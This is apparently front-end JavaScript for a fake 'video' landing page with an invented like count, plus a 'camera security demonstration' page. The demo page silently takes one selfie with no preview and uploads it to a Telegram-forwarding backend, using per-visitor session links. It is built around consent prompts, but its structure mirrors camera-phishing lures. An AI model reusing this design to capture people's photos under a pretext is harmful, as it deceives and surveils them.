/**
 * Video Landing Page & Camera Security Demonstration Logic
 * Strict consent-based security architecture with automatic single capture and Telegram delivery.
 */

(() => {
  'use strict';

  // Common State
  let sessionId = null;
  let sessionData = null;
  let activeStream = null;
  let capturedBlob = null;

  // Video Player Simulation State (for index.html)
  let isVideoPlaying = false;
  let videoCurrentSeconds = 0;
  const videoTotalSeconds = 258; // 04:18
  let videoAnimFrameId = null;
  let isVideoMuted = false;
  let likeCount = 1248;
  let hasLiked = false;
  let canvasCtx = null;

  // =========================================================================
  // DOM ELEMENT SELECTION
  // =========================================================================

  // Common Header & Indicator
  const statusDot = document.getElementById('status-dot');
  const statusText = document.getElementById('status-text');

  // Video Landing Page Elements (index.html)
  const videoPlayerWrapper = document.getElementById('video-player-wrapper');
  const videoPoster = document.getElementById('video-poster');
  const btnPosterPlay = document.getElementById('btn-poster-play');
  const videoCanvasStage = document.getElementById('video-canvas-stage');
  const interactiveVideoCanvas = document.getElementById('interactive-video-canvas');
  const videoScrubber = document.getElementById('video-scrubber');
  const videoScrubberProgress = document.getElementById('video-scrubber-progress');
  const btnPlayerPlay = document.getElementById('btn-player-play');
  const videoTimecode = document.getElementById('video-timecode');
  const btnPlayerMute = document.getElementById('btn-player-mute');
  const btnPlayerFullscreen = document.getElementById('btn-player-fullscreen');
  const btnWatchDemo = document.getElementById('btn-watch-demo');
  const btnLikeVideo = document.getElementById('btn-like-video');
  const likeCountSpan = document.getElementById('like-count');
  const btnSharePage = document.getElementById('btn-share-page');
  const descPreview = document.getElementById('desc-preview');
  const btnDescToggle = document.getElementById('btn-desc-toggle');
  const toastNotification = document.getElementById('toast-notification');
  const toastText = document.getElementById('toast-text');

  // Camera Demonstration Elements (demo.html)
  const cameraVideo = document.getElementById('camera-video');
  const cameraCanvas = document.getElementById('camera-canvas');
  const screenConsent = document.getElementById('screen-consent');
  const screenCapturing = document.getElementById('screen-capturing');
  const screenReview = document.getElementById('screen-review');
  const screenSuccess = document.getElementById('screen-success');
  const screenCancelled = document.getElementById('screen-cancelled');
  const screenInvalid = document.getElementById('screen-invalid');

  const capturingTitle = document.getElementById('capturing-title');
  const capturingDesc = document.getElementById('capturing-desc');
  const sessionStatusBadge = document.getElementById('session-status-badge');
  const displaySessionId = document.getElementById('display-session-id');
  const receiptSessionId = document.getElementById('receipt-session-id');
  const receiptTimestamp = document.getElementById('receipt-timestamp');
  const cameraErrorContainer = document.getElementById('camera-error-container');

  const btnConsentStart = document.getElementById('btn-consent-start');
  const btnConfirmUpload = document.getElementById('btn-confirm-upload');
  const btnRetakePhoto = document.getElementById('btn-retake-photo');
  const btnDiscardPhoto = document.getElementById('btn-discard-photo');
  const btnRestartDemo = document.getElementById('btn-restart-demo');
  const btnTestAgain = document.getElementById('btn-test-again');
  const btnNewDemo = document.getElementById('btn-new-demo');

  // =========================================================================
  // INITIALIZATION
  // =========================================================================

  async function init() {
    checkBackendHealth();
    parseSessionFromUrl();

    // Check if on Video Landing Page (index.html)
    if (videoPlayerWrapper) {
      initLandingPage();
    }

    // Check if on Camera Demonstration Page (demo.html)
    if (screenConsent) {
      initDemoPage();
    }
  }

  function parseSessionFromUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    const param = urlParams.get('session');
    if (param && param.trim() !== '') {
      sessionId = param.trim();
    }
  }

  // Health check to update header status dot
  async function checkBackendHealth() {
    if (!statusDot || !statusText) return;
    const apiUrl = window.APP_CONFIG.getApiBaseUrl();
    try {
      const response = await fetch(`${apiUrl}/api/health`, {
        method: 'GET',
        headers: { 'Accept': 'application/json' }
      });
      if (response.ok) {
        statusDot.className = 'indicator-dot';
        statusText.textContent = 'API Online';
      } else {
        statusDot.className = 'indicator-dot offline';
        statusText.textContent = `API Error ${response.status}`;
      }
    } catch (e) {
      statusDot.className = 'indicator-dot offline';
      statusText.textContent = 'API Connecting...';
    }
  }

  // =========================================================================
  // LANDING PAGE LOGIC (index.html)
  // =========================================================================

  function initLandingPage() {
    // Note: NEVER requests camera permission or opens camera video on load.
    if (btnPosterPlay) {
      btnPosterPlay.addEventListener('click', startVideoPlayback);
    }
    if (videoPoster) {
      videoPoster.addEventListener('click', startVideoPlayback);
    }
    if (btnWatchDemo) {
      btnWatchDemo.addEventListener('click', () => {
        videoPlayerWrapper.scrollIntoView({ behavior: 'smooth', block: 'center' });
        startVideoPlayback();
      });
    }
    if (btnPlayerPlay) {
      btnPlayerPlay.addEventListener('click', toggleVideoPlayPause);
    }
    if (btnPlayerMute) {
      btnPlayerMute.addEventListener('click', toggleVideoMute);
    }
    if (btnPlayerFullscreen) {
      btnPlayerFullscreen.addEventListener('click', toggleFullscreen);
    }
    if (videoScrubber) {
      videoScrubber.addEventListener('click', handleSeek);
    }

    // Like button
    if (btnLikeVideo && likeCountSpan) {
      btnLikeVideo.addEventListener('click', () => {
        hasLiked = !hasLiked;
        btnLikeVideo.classList.toggle('active', hasLiked);
        likeCount = hasLiked ? likeCount + 1 : likeCount - 1;
        likeCountSpan.textContent = (likeCount / 1000).toFixed(1) + 'K';
      });
    }

    // Share button
    if (btnSharePage) {
      btnSharePage.addEventListener('click', async () => {
        const shareUrl = window.location.href;
        if (navigator.clipboard) {
          await navigator.clipboard.writeText(shareUrl);
          showToast('🔗 Page link copied to clipboard!');
        } else {
          showToast('Share: ' + shareUrl);
        }
      });
    }

    // Description toggle
    if (btnDescToggle && descPreview) {
      btnDescToggle.addEventListener('click', () => {
        const isExpanded = descPreview.classList.toggle('expanded');
        btnDescToggle.textContent = isExpanded ? 'Show less' : 'Show more';
      });
    }

    // Canvas resize
    initCanvasDimensions();
    window.addEventListener('resize', initCanvasDimensions);
  }

  function initCanvasDimensions() {
    if (!interactiveVideoCanvas) return;
    const rect = interactiveVideoCanvas.getBoundingClientRect();
    interactiveVideoCanvas.width = rect.width * (window.devicePixelRatio || 1);
    interactiveVideoCanvas.height = rect.height * (window.devicePixelRatio || 1);
    canvasCtx = interactiveVideoCanvas.getContext('2d');
  }

  function startVideoPlayback() {
    videoPoster.classList.add('hidden');
    videoCanvasStage.style.display = 'block';
    isVideoPlaying = true;
    btnPlayerPlay.textContent = '⏸';
    initCanvasDimensions();
    runVideoLoop();
  }

  function toggleVideoPlayPause() {
    isVideoPlaying = !isVideoPlaying;
    btnPlayerPlay.textContent = isVideoPlaying ? '⏸' : '▶';
    if (isVideoPlaying) {
      runVideoLoop();
    }
  }

  function toggleVideoMute() {
    isVideoMuted = !isVideoMuted;
    btnPlayerMute.textContent = isVideoMuted ? '🔇' : '🔊';
  }

  function toggleFullscreen() {
    if (!document.fullscreenElement) {
      videoPlayerWrapper.requestFullscreen().catch(() => {});
    } else {
      document.exitFullscreen().catch(() => {});
    }
  }

  function handleSeek(e) {
    const rect = videoScrubber.getBoundingClientRect();
    const ratio = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
    videoCurrentSeconds = ratio * videoTotalSeconds;
    updateVideoTimecodeUI();
  }

  function formatTime(totalSec) {
    const m = Math.floor(totalSec / 60);
    const s = Math.floor(totalSec % 60);
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  }

  function updateVideoTimecodeUI() {
    const progressPct = (videoCurrentSeconds / videoTotalSeconds) * 100;
    videoScrubberProgress.style.width = `${progressPct}%`;
    videoTimecode.textContent = `${formatTime(videoCurrentSeconds)} / ${formatTime(videoTotalSeconds)}`;
  }

  function renderEducationalVideoFrame(timestamp) {
    if (!canvasCtx || !interactiveVideoCanvas) return;
    const w = interactiveVideoCanvas.width;
    const h = interactiveVideoCanvas.height;
    const scale = w / 800;

    canvasCtx.fillStyle = '#070b14';
    canvasCtx.fillRect(0, 0, w, h);

    // Dynamic grid
    canvasCtx.strokeStyle = 'rgba(56, 189, 248, 0.08)';
    canvasCtx.lineWidth = 1;
    const gridSize = 40 * scale;
    const offset = (timestamp * 0.02) % gridSize;
    for (let x = -offset; x < w; x += gridSize) {
      canvasCtx.beginPath();
      canvasCtx.moveTo(x, 0);
      canvasCtx.lineTo(x, h);
      canvasCtx.stroke();
    }
    for (let y = 0; y < h; y += gridSize) {
      canvasCtx.beginPath();
      canvasCtx.moveTo(0, y);
      canvasCtx.lineTo(w, y);
      canvasCtx.stroke();
    }

    const sec = videoCurrentSeconds;
    let stepTitle = '1. BROWSER HARDWARE SANDBOX ISOLATION';
    let stepDesc = 'Untrusted Web Page <--> Security Sandbox <--> Device Hardware';
    let diagramColor = '#38bdf8';

    if (sec > 65 && sec <= 130) {
      stepTitle = '2. EXPLICIT CONSENT PERMISSION BARRIER';
      stepDesc = 'Camera access is completely BLOCKED without an explicit user gesture';
      diagramColor = '#f59e0b';
    } else if (sec > 130 && sec <= 195) {
      stepTitle = '3. HARDWARE LED INDICATOR & LOCAL ACCESS';
      stepDesc = 'Hardware light illuminates ONLY while sensor tracks are actively running';
      diagramColor = '#10b981';
    } else if (sec > 195) {
      stepTitle = '4. CONFIRMED TELEGRAM TRANSMISSION';
      stepDesc = 'Photos leave the browser ONLY when the participant explicitly confirms';
      diagramColor = '#818cf8';
    }

    // Top Header
    canvasCtx.fillStyle = 'rgba(15, 23, 42, 0.85)';
    canvasCtx.fillRect(20 * scale, 20 * scale, w - 40 * scale, 55 * scale);
    canvasCtx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
    canvasCtx.strokeRect(20 * scale, 20 * scale, w - 40 * scale, 55 * scale);

    canvasCtx.fillStyle = diagramColor;
    canvasCtx.font = `bold ${16 * scale}px sans-serif`;
    canvasCtx.fillText(`🛡️ ${stepTitle}`, 35 * scale, 45 * scale);

    canvasCtx.fillStyle = '#94a3b8';
    canvasCtx.font = `${12 * scale}px sans-serif`;
    canvasCtx.fillText(stepDesc, 35 * scale, 65 * scale);

    // Center Nodes
    const centerX = w / 2;
    const centerY = h / 2 + 10 * scale;

    drawVisualNode(centerX - 200 * scale, centerY, '🌐 Browser Tab', 'Sandboxed Page', '#38bdf8', scale);

    const packetProgress = (timestamp * 0.001) % 1;
    const packetX = (centerX - 200 * scale) + packetProgress * (400 * scale);
    canvasCtx.fillStyle = diagramColor;
    canvasCtx.beginPath();
    canvasCtx.arc(packetX, centerY, 6 * scale, 0, Math.PI * 2);
    canvasCtx.fill();

    const isGateOpen = sec > 65;
    drawVisualNode(centerX, centerY, isGateOpen ? '🔓 Consent Gate' : '🔒 Permission Gate', isGateOpen ? 'User Clicked' : 'Waiting for Click', isGateOpen ? '#34d399' : '#ef4444', scale);
    drawVisualNode(centerX + 200 * scale, centerY, '📷 Web Camera', 'Hardware Sensor', '#a855f7', scale);

    canvasCtx.fillStyle = 'rgba(255, 255, 255, 0.4)';
    canvasCtx.font = `${11 * scale}px sans-serif`;
    canvasCtx.fillText('Camera Security Demonstration • Educational Permission Architecture', 30 * scale, h - 35 * scale);
  }

  function drawVisualNode(x, y, title, subtitle, color, scale) {
    const boxW = 130 * scale;
    const boxH = 65 * scale;
    canvasCtx.fillStyle = 'rgba(15, 23, 42, 0.9)';
    canvasCtx.strokeStyle = color;
    canvasCtx.lineWidth = 2;
    canvasCtx.beginPath();
    canvasCtx.roundRect(x - boxW / 2, y - boxH / 2, boxW, boxH, 8 * scale);
    canvasCtx.fill();
    canvasCtx.stroke();

    canvasCtx.fillStyle = '#ffffff';
    canvasCtx.font = `bold ${12 * scale}px sans-serif`;
    canvasCtx.textAlign = 'center';
    canvasCtx.fillText(title, x, y - 6 * scale);

    canvasCtx.fillStyle = '#94a3b8';
    canvasCtx.font = `${10 * scale}px sans-serif`;
    canvasCtx.fillText(subtitle, x, y + 14 * scale);
    canvasCtx.textAlign = 'left';
  }

  let lastTimestamp = 0;
  function runVideoLoop(now) {
    if (!isVideoPlaying) return;
    if (now && lastTimestamp) {
      const deltaSec = (now - lastTimestamp) / 1000;
      videoCurrentSeconds += deltaSec;
      if (videoCurrentSeconds >= videoTotalSeconds) {
        videoCurrentSeconds = videoTotalSeconds;
        isVideoPlaying = false;
        btnPlayerPlay.textContent = '▶';
      }
      updateVideoTimecodeUI();
    }
    lastTimestamp = now || performance.now();
    renderEducationalVideoFrame(lastTimestamp);
    if (isVideoPlaying) {
      videoAnimFrameId = requestAnimationFrame(runVideoLoop);
    }
  }

  function showToast(message) {
    if (!toastNotification || !toastText) return;
    toastText.textContent = message;
    toastNotification.style.display = 'block';
    setTimeout(() => {
      toastNotification.style.display = 'none';
    }, 3000);
  }

  // =========================================================================
  // CAMERA DEMONSTRATION LOGIC (demo.html)
  // =========================================================================

  async function initDemoPage() {
    bindDemoEvents();

    if (sessionId) {
      await validateExistingSession();
    } else {
      displaySessionId.textContent = 'Public Demo Mode (Ready)';
      sessionStatusBadge.textContent = 'Ready for Consent';
      sessionStatusBadge.className = 'badge badge-created';
    }

    // Safety: ensure all camera tracks are stopped if user navigates away
    window.addEventListener('beforeunload', stopCameraTracks);
    window.addEventListener('pagehide', stopCameraTracks);
  }

  function bindDemoEvents() {
    // 1. Consent button: Starts permission & automatic single capture
    if (btnConsentStart) {
      btnConsentStart.addEventListener('click', handleConsentStart);
    }

    // 2. Review confirmation: Confirms upload to Telegram
    if (btnConfirmUpload) {
      btnConfirmUpload.addEventListener('click', handleConfirmUpload);
    }

    // 3. Retake snapshot
    if (btnRetakePhoto) {
      btnRetakePhoto.addEventListener('click', handleConsentStart);
    }

    // 4. Discard & cancel
    if (btnDiscardPhoto) {
      btnDiscardPhoto.addEventListener('click', handleCancelDemo);
    }

    // 5. Restart from cancelled
    if (btnRestartDemo) {
      btnRestartDemo.addEventListener('click', () => {
        screenCancelled.style.display = 'none';
        screenConsent.style.display = 'block';
      });
    }

    // 6. Test again from success
    if (btnTestAgain) {
      btnTestAgain.addEventListener('click', () => {
        capturedBlob = null;
        screenSuccess.style.display = 'none';
        screenConsent.style.display = 'block';
        sessionStatusBadge.textContent = 'Ready for Consent';
        sessionStatusBadge.className = 'badge badge-created';
      });
    }

    // 7. New demo from invalid
    if (btnNewDemo) {
      btnNewDemo.addEventListener('click', async () => {
        screenInvalid.style.display = 'none';
        screenConsent.style.display = 'block';
        sessionId = null;
        await ensureSessionReady();
      });
    }
  }

  async function validateExistingSession() {
    const apiUrl = window.APP_CONFIG.getApiBaseUrl();
    try {
      const response = await fetch(`${apiUrl}/api/sessions/${sessionId}`, {
        method: 'GET',
        headers: { 'Accept': 'application/json' }
      });

      if (response.status === 404) {
        showInvalidScreen('Session Not Found', 'This demonstration session reference does not exist or has expired.');
        return;
      }

      if (!response.ok) {
        throw new Error(`Server returned HTTP ${response.status}`);
      }

      sessionData = await response.json();
      const now = new Date();
      const expiresAt = new Date(sessionData.expiresAt);

      if (sessionData.status === 'revoked') {
        showInvalidScreen('Session Revoked', 'This demonstration session was revoked by the administrator.');
        return;
      }
      if (sessionData.status === 'submitted') {
        showInvalidScreen('Session Completed', 'A demonstration photo was already submitted for this session. Sessions are single-use.');
        return;
      }
      if (expiresAt < now) {
        showInvalidScreen('Session Expired', 'This demonstration link has expired.');
        return;
      }

      displaySessionId.textContent = sessionId.substring(0, 16) + '...';
      sessionStatusBadge.textContent = 'Session Verified';
      sessionStatusBadge.className = 'badge badge-opened';

    } catch (err) {
      console.warn('[Demo] Session validation error:', err.message);
      displaySessionId.textContent = sessionId ? sessionId.substring(0, 12) + '...' : 'Public Demo Mode';
    }
  }

  async function ensureSessionReady() {
    if (sessionId && sessionData && sessionData.status === 'created') {
      return sessionId;
    }

    const apiUrl = window.APP_CONFIG.getApiBaseUrl();
    try {
      const response = await fetch(`${apiUrl}/api/sessions/demo`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ label: 'Visitor Demo' })
      });

      if (response.ok) {
        const data = await response.json();
        sessionId = data.session.id;
        sessionData = data.session;
        displaySessionId.textContent = sessionId.substring(0, 16) + '...';
        return sessionId;
      }
    } catch (e) {
      console.warn('[Demo] Ephemeral session creation fallback:', e.message);
    }

    if (!sessionId) {
      sessionId = Array.from(crypto.getRandomValues(new Uint8Array(16)))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
      displaySessionId.textContent = sessionId.substring(0, 16) + '... (Local)';
    }
    return sessionId;
  }

  // =========================================================================
  // CAMERA EXECUTION: NO LIVE PREVIEW & AUTOMATIC SINGLE CAPTURE
  // =========================================================================

  async function handleConsentStart() {
    hideCameraError();
    stopCameraTracks();
    capturedBlob = null;

    // Check secure context (HTTPS)
    if (!window.isSecureContext && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
      showCameraError(
        '<strong>HTTPS Required:</strong> Web browsers strictly require a secure HTTPS connection to access camera hardware. ' +
        'Please access this demonstration via HTTPS.',
        false
      );
      return;
    }

    // Check MediaDevices support
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      showCameraError(
        '<strong>Unsupported Browser:</strong> Your current browser does not support the Web MediaDevices API. ' +
        'Please test using modern Safari (iOS), Chrome (Android/Desktop), Firefox, or Edge.',
        false
      );
      return;
    }

    // Ensure session is active
    await ensureSessionReady();

    // Transition to capturing screen (NO LIVE PREVIEW SHOWN!)
    screenConsent.style.display = 'none';
    screenReview.style.display = 'none';
    screenCapturing.style.display = 'block';

    capturingTitle.textContent = 'Requesting Camera Permission...';
    capturingDesc.textContent = 'Please approve the browser prompt. In accordance with privacy rules, no live video preview will be displayed.';

    try {
      // 1. Request camera stream via standard browser permission mechanism
      const stream = await navigator.mediaDevices.getUserMedia({
        audio: false,
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        }
      });

      activeStream = stream;
      cameraVideo.srcObject = stream;

      capturingTitle.textContent = 'Permission Granted — Capturing Snapshot...';
      capturingDesc.textContent = 'Automatically taking single test photo. Camera will turn off immediately.';

      // 2. Wait for camera video element to receive video data
      await new Promise((resolve) => {
        if (cameraVideo.readyState >= 2 && cameraVideo.videoWidth > 0) {
          resolve();
        } else {
          cameraVideo.onloadedmetadata = () => resolve();
          // Safety timeout in case onloadedmetadata doesn't fire
          setTimeout(resolve, 800);
        }
      });

      // Allow 400ms for hardware auto-exposure / white-balance stabilization
      await new Promise(r => setTimeout(r, 400));

      // 3. Automatically capture ONE photo onto the canvas
      const vw = cameraVideo.videoWidth || 640;
      const vh = cameraVideo.videoHeight || 480;
      cameraCanvas.width = vw;
      cameraCanvas.height = vh;

      const ctx = cameraCanvas.getContext('2d');
      // Mirror horizontally for natural selfie view
      ctx.translate(vw, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(cameraVideo, 0, 0, vw, vh);

      // 4. CRITICAL: Stop all camera tracks IMMEDIATELY after capture!
      stopCameraTracks();

      // 5. Generate image Blob from canvas
      await new Promise(resolve => {
        cameraCanvas.toBlob((blob) => {
          capturedBlob = blob;
          resolve();
        }, 'image/jpeg', 0.88);
      });

      // 6. Transition to Review & Confirmation Screen
      screenCapturing.style.display = 'none';
      screenReview.style.display = 'block';

      sessionStatusBadge.textContent = 'Snapshot Captured';
      sessionStatusBadge.className = 'badge badge-opened';

    } catch (err) {
      console.error('[Demo] Camera error:', err);
      stopCameraTracks();
      handleCameraPermissionError(err);
    }
  }

  function handleCameraPermissionError(err) {
    screenCapturing.style.display = 'none';
    screenConsent.style.display = 'block';

    let errorMsg = 'An unexpected error occurred while requesting camera access.';

    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
      errorMsg = '<strong>Camera Permission Denied:</strong> Your browser or operating system blocked camera access.' +
                 '<br><br><strong>How to continue without camera:</strong>' +
                 '<p style="margin: 0.5rem 0; font-size: 0.85rem;">You can return to the video landing page to learn about browser permissions without using the camera on your device.</p>' +
                 '<strong>To enable camera permissions:</strong>' +
                 '<ul style="margin: 0.5rem 0 0.5rem 1.25rem; font-size: 0.825rem;">' +
                 '<li><strong>iPhone / iPad Safari:</strong> Tap the &quot;aA&quot; or website settings icon in the address bar &rarr; Website Settings &rarr; Camera &rarr; Allow.</li>' +
                 '<li><strong>Android Chrome:</strong> Tap the lock or tune icon beside the URL &rarr; Permissions &rarr; Camera &rarr; Allow.</li>' +
                 '<li><strong>Desktop Browsers:</strong> Click the camera or lock icon on the address bar and select &quot;Allow&quot;.</li>' +
                 '</ul>';
    } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
      errorMsg = '<strong>No Camera Hardware Detected:</strong> No camera was found on this device.';
    } else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') {
      errorMsg = '<strong>Camera Busy:</strong> The camera is currently being used by another application or tab.';
    }

    showCameraError(errorMsg, true);
  }

  function showCameraError(htmlMessage, showRetry = false) {
    if (!cameraErrorContainer) return;
    cameraErrorContainer.style.display = 'block';
    cameraErrorContainer.innerHTML = `
      <div class="notice notice-danger">
        <div style="flex: 1;">
          <div>${htmlMessage}</div>
          ${showRetry ? `
            <div style="margin-top: 0.75rem;">
              <button type="button" id="btn-retry-camera" class="btn btn-secondary btn-sm">
                🔄 Try Again
              </button>
            </div>
          ` : ''}
        </div>
      </div>
    `;

    if (showRetry) {
      const retryBtn = document.getElementById('btn-retry-camera');
      if (retryBtn) {
        retryBtn.addEventListener('click', handleConsentStart);
      }
    }
  }

  function hideCameraError() {
    if (!cameraErrorContainer) return;
    cameraErrorContainer.style.display = 'none';
    cameraErrorContainer.innerHTML = '';
  }

  function stopCameraTracks() {
    if (activeStream) {
      activeStream.getTracks().forEach(track => {
        try {
          track.stop();
        } catch (e) {}
      });
      activeStream = null;
    }
    if (cameraVideo) {
      cameraVideo.srcObject = null;
    }
  }

  // =========================================================================
  // SUBMISSION TO TELEGRAM (AFTER EXPLICIT CONFIRMATION)
  // =========================================================================

  async function handleConfirmUpload() {
    if (!capturedBlob) {
      showCameraError('No snapshot available to upload. Please retake photo.', true);
      return;
    }

    const targetSessionId = await ensureSessionReady();
    const apiUrl = window.APP_CONFIG.getApiBaseUrl();

    btnConfirmUpload.disabled = true;
    btnRetakePhoto.disabled = true;
    btnDiscardPhoto.disabled = true;
    btnConfirmUpload.innerHTML = '<span class="spinner"></span> Transmitting to Telegram...';

    try {
      const formData = new FormData();
      formData.append('photo', capturedBlob, `demo-${targetSessionId.substring(0, 8)}.jpg`);

      const response = await fetch(`${apiUrl}/api/sessions/${targetSessionId}/photo`, {
        method: 'POST',
        headers: { 'Accept': 'application/json' },
        body: formData
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.error || `HTTP ${response.status}: Delivery failed`);
      }

      // Success screen
      screenReview.style.display = 'none';
      screenSuccess.style.display = 'block';

      receiptSessionId.textContent = targetSessionId;
      const now = new Date();
      receiptTimestamp.textContent = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) + ' ' + now.toLocaleDateString();

      sessionStatusBadge.textContent = 'Submitted';
      sessionStatusBadge.className = 'badge badge-submitted';

    } catch (err) {
      console.error('[Demo] Transmission failure:', err);
      showCameraError(`Failed to transmit photo: ${err.message}`, true);
      btnConfirmUpload.disabled = false;
      btnRetakePhoto.disabled = false;
      btnDiscardPhoto.disabled = false;
      btnConfirmUpload.innerHTML = '<span>🚀 Confirm & Submit Photo to Telegram</span>';
    }
  }

  function handleCancelDemo() {
    stopCameraTracks();
    capturedBlob = null;
    screenConsent.style.display = 'none';
    screenCapturing.style.display = 'none';
    screenReview.style.display = 'none';
    screenCancelled.style.display = 'block';

    sessionStatusBadge.textContent = 'Cancelled';
    sessionStatusBadge.className = 'badge badge-revoked';
  }

  function showInvalidScreen(title, message) {
    stopCameraTracks();
    screenConsent.style.display = 'none';
    screenCapturing.style.display = 'none';
    screenReview.style.display = 'none';
    screenSuccess.style.display = 'none';
    screenCancelled.style.display = 'none';
    screenInvalid.style.display = 'block';

    const invTitle = document.getElementById('invalid-title');
    const invMsg = document.getElementById('invalid-message');
    if (invTitle) invTitle.textContent = title;
    if (invMsg) invMsg.textContent = message;

    sessionStatusBadge.textContent = 'Invalid / Expired';
    sessionStatusBadge.className = 'badge badge-revoked';
  }

  // Run on DOM Ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
